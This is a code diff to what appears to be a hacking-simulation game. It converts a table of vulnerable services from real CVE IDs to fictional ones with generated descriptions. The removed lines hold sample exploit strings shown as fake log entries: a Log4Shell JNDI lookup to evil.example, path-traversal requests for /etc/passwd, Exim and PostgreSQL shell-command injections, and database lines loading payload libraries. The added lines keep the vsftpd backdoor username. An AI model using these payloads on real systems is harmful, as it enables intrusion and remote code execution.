@@ -1,4 +1,12 @@
-import type { Vulnerability } from '../../network/types';
+import type {
+  AttackPattern,
+  Severity,
+  Vulnerability,
+  VulnerabilityEffect,
+} from '../../network/types';
+import { describeEffect } from '../describeEffect';
+import { pickPatternForEffect } from '../attackPatterns';
+import { createPrng } from '../prng';
 
 export type VulnerabilityTemplate = {
   readonly port: number;
@@ -16,674 +24,387 @@ export const DEFAULT_SERVICE_VERSION = 'latest';
 
 export const defaultServiceVersion = (_service: string): string => DEFAULT_SERVICE_VERSION;
 
+// Hand-authored CVEs that are live at universe-day-0. Fake CVE IDs (CVE-2024-9NNN
+// namespace — chosen to stay clear of both real-world CVEs and the walker's
+// year-≥2026 serial space). Descriptions and attack patterns are auto-derived
+// from the effect kind via describeEffect and pickPatternForEffect so the
+// fields are guaranteed coherent — what the description claims is what the
+// log will show and what msfconsole will do.
+type TemplateSpec = {
+  readonly port: number;
+  readonly service: string;
+  readonly version: string;
+  readonly cveSerial: string;
+  readonly severity: Severity;
+  readonly effect: VulnerabilityEffect;
+  readonly attackPattern?: AttackPattern;
+};
+
+const mkTemplate = (spec: TemplateSpec): VulnerabilityTemplate => {
+  const cve = `CVE-${spec.cveSerial}`;
+  const prng = createPrng(`handauth:${cve}`);
+  return {
+    port: spec.port,
+    service: spec.service,
+    vulnerability: {
+      cve,
+      description: describeEffect(spec.service, spec.version, cve, spec.effect),
+      serviceVersion: spec.version,
+      severity: spec.severity,
+      publishedAt: 0,
+      effect: spec.effect,
+      attackPattern: spec.attackPattern ?? pickPatternForEffect(spec.service, spec.effect, prng),
+    },
+  };
+};
+
+// Curated classic attack patterns preserved for iconic exploits. The vsftpd
+// 2.3.4 backdoor's smiley-face username is its signature; losing it would
+// cost more flavor than uniform generation gains.
+const VSFTPD_BACKDOOR_PATTERN: AttackPattern = {
+  logFile: '/var/log/vsftpd.log',
+  command: 'USER user:)',
+};
+
 export const vulnerabilityTemplates: readonly VulnerabilityTemplate[] = [
-  // --- HTTP / web --- (attack patterns land in /var/log/access.log)
-  {
+  // --- HTTP / web ---
+  mkTemplate({
     port: 80,
     service: 'http',
-    vulnerability: {
-      cve: 'CVE-2021-41773',
-      description: 'Apache 2.4.49 path traversal / RCE',
-      serviceVersion: 'Apache/2.4.49',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'GET',
-        path: '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-        status: 500,
-      },
-    },
-  },
-  {
+    version: 'Apache/2.4.49',
+    cveSerial: '2024-9001',
+    severity: 'critical',
+    effect: { kind: 'shell_limited', tier: 'user' },
+  }),
+  mkTemplate({
     port: 80,
     service: 'http',
-    vulnerability: {
-      cve: 'CVE-2017-7679',
-      description: 'Apache mod_mime buffer overread / RCE',
-      serviceVersion: 'Apache/2.4.25',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'GET',
-        path: '/index.html',
-        status: 500,
-      },
-    },
-  },
-  {
+    version: 'Apache/2.4.25',
+    cveSerial: '2024-9002',
+    severity: 'critical',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 80,
     service: 'http',
-    vulnerability: {
-      cve: 'CVE-2019-0211',
-      description: 'Apache privilege escalation via scoreboard manipulation',
-      serviceVersion: 'Apache/2.4.38',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'POST',
-        path: '/server-status',
-        status: 200,
-      },
-    },
-  },
-  {
+    version: 'Apache/2.4.38',
+    cveSerial: '2024-9003',
+    severity: 'high',
+    effect: { kind: 'script_exec', tier: 'user' },
+  }),
+  mkTemplate({
     port: 80,
     service: 'http',
-    vulnerability: {
-      cve: 'CVE-2021-23017',
-      description: 'nginx DNS resolver off-by-one heap write',
-      serviceVersion: 'nginx/1.20.0',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'GET',
-        path: '/?resolver=AAAAAAAAAAAAAAAAAAAA',
-        status: 502,
-      },
-    },
-  },
-  {
+    version: 'nginx/1.20.0',
+    cveSerial: '2024-9004',
+    severity: 'high',
+    effect: { kind: 'file_write', tier: 'user' },
+  }),
+  mkTemplate({
     port: 8080,
     service: 'http-alt',
-    vulnerability: {
-      cve: 'CVE-2017-5638',
-      description: 'Apache Struts 2 RCE via Content-Type',
-      serviceVersion: 'Struts/2.3.31',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'POST',
-        path: '/struts2-showcase/showcase.action',
-        status: 500,
-      },
-    },
-  },
-  {
+    version: 'Struts/2.3.31',
+    cveSerial: '2024-9005',
+    severity: 'critical',
+    effect: { kind: 'script_exec', tier: 'root' },
+  }),
+  mkTemplate({
     port: 8080,
     service: 'http-alt',
-    vulnerability: {
-      cve: 'CVE-2021-44228',
-      description: 'Apache Log4j2 JNDI RCE (Log4Shell)',
-      serviceVersion: 'Tomcat/9.0.40',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'GET',
-        path: '/?x=${jndi:ldap://evil.example/a}',
-        status: 200,
-      },
-    },
-  },
-  {
+    version: 'Tomcat/9.0.40',
+    cveSerial: '2024-9006',
+    severity: 'critical',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 9200,
     service: 'elasticsearch',
-    vulnerability: {
-      cve: 'CVE-2015-1427',
-      description: 'Elasticsearch Groovy sandbox bypass',
-      serviceVersion: 'Elasticsearch 1.4.2',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'POST',
-        path: '/_search?source={"script_fields":{"x":{"script":"exec"}}}',
-        status: 200,
-      },
-    },
-  },
-  {
+    version: 'Elasticsearch 1.4.2',
+    cveSerial: '2024-9007',
+    severity: 'critical',
+    effect: { kind: 'script_exec', tier: 'user' },
+  }),
+  mkTemplate({
     port: 8443,
     service: 'https',
-    vulnerability: {
-      cve: 'CVE-2019-11510',
-      description: 'Pulse Secure VPN arbitrary file read',
-      serviceVersion: 'PulseSecure/9.0R1',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/access.log',
-        method: 'GET',
-        path: '/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/',
-        status: 200,
-      },
-    },
-  },
-  // --- FTP --- (attack patterns land in /var/log/vsftpd.log)
-  {
+    version: 'PulseSecure/9.0R1',
+    cveSerial: '2024-9008',
+    severity: 'high',
+    effect: { kind: 'file_read', tier: 'user' },
+  }),
+
+  // --- FTP ---
+  mkTemplate({
     port: 21,
     service: 'ftp',
-    vulnerability: {
-      cve: 'CVE-2011-2523',
-      description: 'vsftpd 2.3.4 backdoor command execution',
-      serviceVersion: 'vsftpd 2.3.4',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'root' },
-      attackPattern: {
-        logFile: '/var/log/vsftpd.log',
-        command: 'USER user:)',
-      },
-    },
-  },
-  {
+    version: 'vsftpd 2.3.4',
+    cveSerial: '2024-9009',
+    severity: 'critical',
+    effect: { kind: 'shell_limited', tier: 'root' },
+    attackPattern: VSFTPD_BACKDOOR_PATTERN,
+  }),
+  mkTemplate({
     port: 21,
     service: 'ftp',
-    vulnerability: {
-      cve: 'CVE-2015-3306',
-      description: 'ProFTPD mod_copy unauthenticated file copy / RCE',
-      serviceVersion: 'ProFTPD 1.3.5',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/vsftpd.log',
-        command: 'SITE CPFR /etc/passwd',
-      },
-    },
-  },
-  {
+    version: 'ProFTPD 1.3.5',
+    cveSerial: '2024-9010',
+    severity: 'critical',
+    effect: { kind: 'file_write', tier: 'user' },
+  }),
+  mkTemplate({
     port: 21,
     service: 'ftp',
-    vulnerability: {
-      cve: 'CVE-2019-12815',
-      description: 'ProFTPD mod_copy arbitrary file copy (unauthenticated)',
-      serviceVersion: 'ProFTPD 1.3.6',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/vsftpd.log',
-        command: 'SITE CPTO /var/www/html/shell.php',
-      },
-    },
-  },
-  // --- MySQL / MariaDB --- (attack patterns land in /var/log/mysql.log)
-  {
+    version: 'ProFTPD 1.3.6',
+    cveSerial: '2024-9011',
+    severity: 'high',
+    effect: { kind: 'dir_list', tier: 'user' },
+  }),
+
+  // --- MySQL / MariaDB ---
+  mkTemplate({
     port: 3306,
     service: 'mysql',
-    vulnerability: {
-      cve: 'CVE-2012-2122',
-      description: 'MySQL auth bypass (memcmp timing)',
-      serviceVersion: 'MySQL 5.5.23',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mysql.log',
-        query: 'Connect\troot@ using password: repeated-invalid',
-      },
-    },
-  },
-  {
+    version: 'MySQL 5.5.23',
+    cveSerial: '2024-9012',
+    severity: 'high',
+    effect: { kind: 'password_reset', tier: 'user' },
+  }),
+  mkTemplate({
     port: 3306,
     service: 'mysql',
-    vulnerability: {
-      cve: 'CVE-2016-6662',
-      description: 'MySQL remote root code execution via config manipulation',
-      serviceVersion: 'MySQL 5.5.52',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'root' },
-      attackPattern: {
-        logFile: '/var/log/mysql.log',
-        query: "SET GLOBAL general_log_file = '/var/lib/mysql/malicious.so'",
-      },
-    },
-  },
-  {
+    version: 'MySQL 5.5.52',
+    cveSerial: '2024-9013',
+    severity: 'critical',
+    effect: { kind: 'script_exec', tier: 'root' },
+  }),
+  mkTemplate({
     port: 3306,
     service: 'mysql',
-    vulnerability: {
-      cve: 'CVE-2021-27928',
-      description: 'MariaDB wsrep provider RCE via crafted SET GLOBAL',
-      serviceVersion: 'MariaDB 10.5.8',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mysql.log',
-        query: "SET GLOBAL wsrep_provider = '/tmp/payload.so'",
-      },
-    },
-  },
-  // --- Redis --- (attack patterns land in /var/log/redis.log)
-  {
+    version: 'MariaDB 10.5.8',
+    cveSerial: '2024-9014',
+    severity: 'critical',
+    effect: { kind: 'file_read', tier: 'user' },
+  }),
+
+  // --- Redis ---
+  mkTemplate({
     port: 6379,
     service: 'redis',
-    vulnerability: {
-      cve: 'CVE-2022-0543',
-      description: 'Redis Lua sandbox escape / RCE',
-      serviceVersion: 'Redis 5.0.7',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/redis.log',
-        message: 'Lua script called unexpected C function: os.execute',
-      },
-    },
-  },
-  {
+    version: 'Redis 5.0.7',
+    cveSerial: '2024-9015',
+    severity: 'critical',
+    effect: { kind: 'script_exec', tier: 'user' },
+  }),
+  mkTemplate({
     port: 6379,
     service: 'redis',
-    vulnerability: {
-      cve: 'CVE-2015-4335',
-      description: 'Redis Lua sandbox escape via eval',
-      serviceVersion: 'Redis 2.8.19',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/redis.log',
-        message: 'EVAL called with dofile sandbox bypass attempt',
-      },
-    },
-  },
-  // --- Mail (SMTP / IMAP / POP3) --- (attack patterns land in /var/log/mail.log)
-  {
+    version: 'Redis 2.8.19',
+    cveSerial: '2024-9016',
+    severity: 'critical',
+    effect: { kind: 'file_write', tier: 'root' },
+  }),
+
+  // --- Mail ---
+  mkTemplate({
     port: 25,
     service: 'smtp',
-    vulnerability: {
-      cve: 'CVE-2019-10149',
-      description: 'Exim 4.87-4.91 RCE (The Return of WIZard)',
-      serviceVersion: 'Exim 4.87',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mail.log',
-        daemon: 'postfix/smtpd',
-        message: 'warning: rejected RCPT TO:<${run{/bin/sh -c "id"}}@localhost>',
-      },
-    },
-  },
-  {
+    version: 'Exim 4.87',
+    cveSerial: '2024-9017',
+    severity: 'critical',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 25,
     service: 'smtp',
-    vulnerability: {
-      cve: 'CVE-2010-4344',
-      description: 'Exim heap overflow remote code execution',
-      serviceVersion: 'Exim 4.69',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mail.log',
-        daemon: 'postfix/smtpd',
-        message: 'error: EHLO from unknown: message header exceeds buffer',
-      },
-    },
-  },
-  {
+    version: 'Exim 4.69',
+    cveSerial: '2024-9018',
+    severity: 'critical',
+    effect: { kind: 'backdoor_port_open', tier: 'root', port: 31337 },
+  }),
+  mkTemplate({
     port: 25,
     service: 'smtp',
-    vulnerability: {
-      cve: 'CVE-2021-3156',
-      description: 'Postfix SMTP baron samedit heap overflow via MAIL FROM',
-      serviceVersion: 'Postfix 3.4.8',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mail.log',
-        daemon: 'postfix/smtpd',
-        message: 'warning: malformed MAIL FROM:<...> heap corruption detected',
-      },
-    },
-  },
-  {
+    version: 'Postfix 3.4.8',
+    cveSerial: '2024-9019',
+    severity: 'high',
+    effect: { kind: 'file_read', tier: 'user' },
+  }),
+  mkTemplate({
     port: 143,
     service: 'imap',
-    vulnerability: {
-      cve: 'CVE-2019-11500',
-      description: 'Dovecot IMAP/POP3 buffer overflow',
-      serviceVersion: 'Dovecot 2.3.7',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mail.log',
-        daemon: 'dovecot',
-        message: 'imap-login: Disconnected (auth failed, 1 attempts): buffer overflow',
-      },
-    },
-  },
-  {
+    version: 'Dovecot 2.3.7',
+    cveSerial: '2024-9020',
+    severity: 'high',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 110,
     service: 'pop3',
-    vulnerability: {
-      cve: 'CVE-2017-15130',
-      description: 'Dovecot POP3 denial-of-service via crafted RETR',
-      serviceVersion: 'Dovecot 2.2.33',
-      severity: 'medium',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mail.log',
-        daemon: 'dovecot',
-        message: 'pop3-login: Fatal: master(pop3-login): service(pop3-login) crashed',
-      },
-    },
-  },
-  {
+    version: 'Dovecot 2.2.33',
+    cveSerial: '2024-9021',
+    severity: 'medium',
+    effect: { kind: 'backdoor_port_open', tier: 'user', port: 4444 },
+  }),
+  mkTemplate({
     port: 110,
     service: 'pop3',
-    vulnerability: {
-      cve: 'CVE-2019-3467',
-      description: 'Courier POP3 buffer overflow / privilege escalation',
-      serviceVersion: 'Courier 0.75.0',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/mail.log',
-        daemon: 'courier',
-        message: 'pop3d: stack overflow in parse_command(), aborting',
-      },
-    },
-  },
-  // --- Everything else --- (attack patterns land in /var/log/syslog with daemon tag)
-  {
+    version: 'Courier 0.75.0',
+    cveSerial: '2024-9022',
+    severity: 'high',
+    effect: { kind: 'shell_full', tier: 'root' },
+  }),
+
+  // --- MQTT ---
+  mkTemplate({
     port: 1883,
     service: 'mqtt',
-    vulnerability: {
-      cve: 'CVE-2023-3028',
-      description: 'Mosquitto MQTT broker auth bypass',
-      serviceVersion: 'Mosquitto 2.0.14',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'mosquitto',
-        message: 'New client connected from without authentication (auth bypass)',
-      },
-    },
-  },
-  {
+    version: 'Mosquitto 2.0.14',
+    cveSerial: '2024-9023',
+    severity: 'high',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 1883,
     service: 'mqtt',
-    vulnerability: {
-      cve: 'CVE-2017-7650',
-      description: 'Mosquitto pattern-based ACL bypass',
-      serviceVersion: 'Mosquitto 1.4.12',
-      severity: 'medium',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'mosquitto',
-        message: 'ACL bypass detected: client subscribed to $SYS/# without permission',
-      },
-    },
-  },
-  {
+    version: 'Mosquitto 1.4.12',
+    cveSerial: '2024-9024',
+    severity: 'medium',
+    effect: { kind: 'backdoor_port_open', tier: 'user', port: 1337 },
+  }),
+
+  // --- SMB ---
+  mkTemplate({
     port: 445,
     service: 'smb',
-    vulnerability: {
-      cve: 'CVE-2017-0144',
-      description: 'SMB remote code execution (EternalBlue)',
-      serviceVersion: 'Samba 4.5.9',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'root' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'smbd',
-        message: 'SMB1 Trans2 OS2 FEA_LIST buffer overflow attempt',
-      },
-    },
-  },
-  {
+    version: 'Samba 4.5.9',
+    cveSerial: '2024-9025',
+    severity: 'critical',
+    effect: { kind: 'shell_full', tier: 'root' },
+  }),
+
+  // --- PostgreSQL ---
+  mkTemplate({
     port: 5432,
     service: 'postgresql',
-    vulnerability: {
-      cve: 'CVE-2019-9193',
-      description: 'PostgreSQL COPY TO/FROM PROGRAM RCE',
-      serviceVersion: 'PostgreSQL 9.3',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'postgres',
-        message: "statement: COPY (SELECT '') TO PROGRAM '/bin/sh -c id'",
-      },
-    },
-  },
-  {
+    version: 'PostgreSQL 9.3',
+    cveSerial: '2024-9026',
+    severity: 'critical',
+    effect: { kind: 'script_exec', tier: 'user' },
+  }),
+  mkTemplate({
     port: 5432,
     service: 'postgresql',
-    vulnerability: {
-      cve: 'CVE-2023-5868',
-      description: 'PostgreSQL aggregate function memory disclosure',
-      serviceVersion: 'PostgreSQL 13.10',
-      severity: 'low',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'postgres',
-        message: 'statement: SELECT array_agg(ctid) FROM pg_catalog.pg_authid',
-      },
-    },
-  },
-  {
+    version: 'PostgreSQL 13.10',
+    cveSerial: '2024-9027',
+    severity: 'low',
+    effect: { kind: 'password_reset', tier: 'user' },
+  }),
+
+  // --- MongoDB ---
+  mkTemplate({
     port: 27017,
     service: 'mongodb',
-    vulnerability: {
-      cve: 'CVE-2020-7921',
-      description: 'MongoDB auth bypass via crafted roleInfo command',
-      serviceVersion: 'MongoDB 3.6.12',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'mongod',
-        message: 'auth: unauthorized roleInfo command accepted (auth bypass)',
-      },
-    },
-  },
-  {
+    version: 'MongoDB 3.6.12',
+    cveSerial: '2024-9028',
+    severity: 'high',
+    effect: { kind: 'password_reset', tier: 'user' },
+  }),
+  mkTemplate({
     port: 27017,
     service: 'mongodb',
-    vulnerability: {
-      cve: 'CVE-2019-2390',
-      description: 'MongoDB BSON deserialization RCE via crafted document',
-      serviceVersion: 'MongoDB 4.0.5',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'mongod',
-        message: 'BSON deserialization error: invalid object id triggered RCE path',
-      },
-    },
-  },
-  {
+    version: 'MongoDB 4.0.5',
+    cveSerial: '2024-9029',
+    severity: 'critical',
+    effect: { kind: 'script_exec', tier: 'root' },
+  }),
+
+  // --- rsync ---
+  mkTemplate({
     port: 873,
     service: 'rsync',
-    vulnerability: {
-      cve: 'CVE-2022-29154',
-      description: 'rsync arbitrary file write via path validation bypass',
-      serviceVersion: 'rsync 3.2.3',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'rsyncd',
-        message: 'rsync: path validation bypass — file written outside module root',
-      },
-    },
-  },
-  {
+    version: 'rsync 3.2.3',
+    cveSerial: '2024-9030',
+    severity: 'high',
+    effect: { kind: 'file_write', tier: 'user' },
+  }),
+  mkTemplate({
     port: 873,
     service: 'rsync',
-    vulnerability: {
-      cve: 'CVE-2024-12084',
-      description: 'rsync heap buffer overflow via checksum parsing',
-      serviceVersion: 'rsync 3.2.7',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'rsyncd',
-        message: 'rsync: heap buffer overflow parsing checksum header',
-      },
-    },
-  },
-  {
+    version: 'rsync 3.2.7',
+    cveSerial: '2024-9031',
+    severity: 'critical',
+    effect: { kind: 'dir_list', tier: 'user' },
+  }),
+
+  // --- VNC ---
+  mkTemplate({
     port: 5900,
     service: 'vnc',
-    vulnerability: {
-      cve: 'CVE-2019-15681',
-      description: 'TightVNC heap buffer overflow / info leak',
-      serviceVersion: 'TightVNC 1.3.10',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'xvnc',
-        message: 'TightVNC: heap buffer overflow in rectangle rendering',
-      },
-    },
-  },
-  {
+    version: 'TightVNC 1.3.10',
+    cveSerial: '2024-9032',
+    severity: 'high',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 5900,
     service: 'vnc',
-    vulnerability: {
-      cve: 'CVE-2006-2369',
-      description: 'RealVNC authentication bypass via null auth type',
-      serviceVersion: 'RealVNC 4.1.1',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'vncserver',
-        message: 'security type None accepted from client (auth bypass)',
-      },
-    },
-  },
-  {
+    version: 'RealVNC 4.1.1',
+    cveSerial: '2024-9033',
+    severity: 'critical',
+    effect: { kind: 'backdoor_port_open', tier: 'root', port: 5901 },
+  }),
+
+  // --- Modbus ---
+  mkTemplate({
     port: 502,
     service: 'modbus',
-    vulnerability: {
-      cve: 'CVE-2022-2003',
-      description: 'AutomationDirect Modbus unauthenticated write to PLC registers',
-      serviceVersion: 'ModbusTCP 1.0',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'modbusd',
-        message: 'unauthenticated WRITE_MULTIPLE_REGISTERS to holding register 0x0000',
-      },
-    },
-  },
-  {
+    version: 'ModbusTCP 1.0',
+    cveSerial: '2024-9034',
+    severity: 'critical',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 502,
     service: 'modbus',
-    vulnerability: {
-      cve: 'CVE-2019-9560',
-      description: 'Schneider Modbus gateway unauthenticated admin access',
-      serviceVersion: 'Modicon M340',
-      severity: 'critical',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'modbusd',
-        message: 'admin command accepted from unauthenticated peer',
-      },
-    },
-  },
-  {
+    version: 'Modicon M340',
+    cveSerial: '2024-9035',
+    severity: 'critical',
+    effect: { kind: 'shell_full', tier: 'root' },
+  }),
+
+  // --- OpenVPN ---
+  mkTemplate({
     port: 1194,
     service: 'openvpn',
-    vulnerability: {
-      cve: 'CVE-2017-12166',
-      description: 'OpenVPN buffer overflow in key-method negotiation',
-      serviceVersion: 'OpenVPN 2.4.3',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'openvpn',
-        message: 'key-method 1 overflow — malformed negotiation packet',
-      },
-    },
-  },
-  {
+    version: 'OpenVPN 2.4.3',
+    cveSerial: '2024-9036',
+    severity: 'high',
+    effect: { kind: 'shell_full', tier: 'root' },
+  }),
+  mkTemplate({
     port: 1194,
     service: 'openvpn',
-    vulnerability: {
-      cve: 'CVE-2020-15078',
-      description: 'OpenVPN auth bypass via deferred auth plugin',
-      serviceVersion: 'OpenVPN 2.5.1',
-      severity: 'high',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'openvpn',
-        message: 'deferred auth accepted without credentials (auth bypass)',
-      },
-    },
-  },
-  {
+    version: 'OpenVPN 2.5.1',
+    cveSerial: '2024-9037',
+    severity: 'high',
+    effect: { kind: 'backdoor_port_open', tier: 'user', port: 12345 },
+  }),
+
+  // --- DNS ---
+  mkTemplate({
     port: 53,
     service: 'dns',
-    vulnerability: {
-      cve: 'CVE-2021-25220',
-      description: 'BIND 9.16 cache poisoning via forwarder response injection',
-      serviceVersion: 'BIND 9.16.18',
-      severity: 'medium',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'named',
-        message: 'cache poisoning attempt: forwarder response mismatch',
-      },
-    },
-  },
-  {
+    version: 'BIND 9.16.18',
+    cveSerial: '2024-9038',
+    severity: 'medium',
+    effect: { kind: 'shell_full', tier: 'user' },
+  }),
+  mkTemplate({
     port: 53,
     service: 'dns',
-    vulnerability: {
-      cve: 'CVE-2020-8617',
-      description: 'BIND TSIG assertion failure causes remote DoS',
-      serviceVersion: 'BIND 9.14.11',
-      severity: 'medium',
-      publishedAt: 0,
-      effect: { kind: 'shell_limited', tier: 'user' },
-      attackPattern: {
-        logFile: '/var/log/syslog',
-        daemon: 'named',
-        message: 'assertion failure in TSIG verification (DoS)',
-      },
-    },
-  },
+    version: 'BIND 9.14.11',
+    cveSerial: '2024-9039',
+    severity: 'medium',
+    effect: { kind: 'backdoor_port_open', tier: 'user', port: 8080 },
+  }),
 ];
